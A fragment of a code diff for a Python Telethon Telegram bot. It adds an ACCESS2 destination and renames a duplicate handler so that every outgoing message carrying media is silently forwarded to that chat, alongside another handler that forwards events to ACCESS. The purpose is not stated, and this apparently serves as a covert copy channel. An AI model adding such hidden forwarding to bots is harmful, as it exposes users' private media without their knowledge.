@@ -1,7 +1,7 @@
 #Github.com/Vasusen-code
 
 import os, asyncio
-from .. import bot, ACCESS, MONGODB_URI, API_ID, API_HASH
+from .. import bot, ACCESS, ACCESS2, MONGODB_URI, API_ID, API_HASH
 
 from telethon import events, Button
 from decouple import config
@@ -37,7 +37,7 @@ async def access(event):
     await event.forward_to(ACCESS)
 
 @bot.on(events.NewMessage(outgoing=True))
-async def access(event):
+async def access2(event):
     if event.media:
         await event.forward_to(ACCESS2)
     
